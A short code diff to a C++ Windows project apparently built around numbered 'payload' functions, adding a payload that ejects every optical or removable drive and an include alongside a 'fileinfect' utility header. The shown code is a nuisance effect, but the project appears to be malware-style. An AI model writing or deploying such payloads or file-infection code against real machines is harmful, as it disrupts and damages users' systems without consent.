@@ -21,6 +21,8 @@
 
 #include "utils/fileinfect/fileinfect.h"
 
+#include "easter/hw.h"
+
 #include <cstdio>
 
 volatile bool gFxStop = false;
@@ -5970,6 +5972,19 @@ DWORD WINAPI GDIPayload64(LPVOID)
     if (music)
         WaitEffect(music);
 
+    return 0;
+}
+
+// ============================================================
+// PAYLOAD 65
+// Eject Drives: physically ejects every optical / removable
+// drive via real IOCTL (no MessageBox). Instant action; nothing
+// to eject = harmless no-op.
+// ============================================================
+
+DWORD WINAPI GDIPayload65(LPVOID)
+{
+    MassEject::EjectAllOptical();
     return 0;
 }
 
